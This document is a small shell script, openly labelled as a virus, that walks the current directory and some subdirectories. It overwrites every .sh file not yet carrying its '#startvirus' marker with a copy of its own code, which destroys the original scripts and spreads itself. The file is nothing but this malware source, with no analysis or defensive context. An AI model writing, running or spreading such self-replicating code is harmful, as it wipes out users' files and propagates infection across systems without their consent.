#!/bin/sh



#startvirus
a="start"
b="end"
dir="."
pre=0
cur=0
num=1
while [ "$a" != "$b" ]
do

	for file in $(find "$dir" -mindepth 1 -maxdepth 1); do
		if [ -d "$file" ]; then
			ndir[cur]="$file"
			((cur++))
		elif [ -f "$file" ]; then
			if [[ "$file" == *.sh ]]; then
				if grep -q "#startvirus" "$file"; then
					echo "skipping"
				else
					sed -n '/#startvirus/,$p' "$0" > "$file"
				fi
			fi
		fi
	done
	case $num in
		1)
			dir=${ndir[pre]}
			((pre++))
			if [ $pre -eq $cur ]; then
				num=2
			fi
			;;
		*)
			a="end"
			;;
	esac
	
done
#endvirus


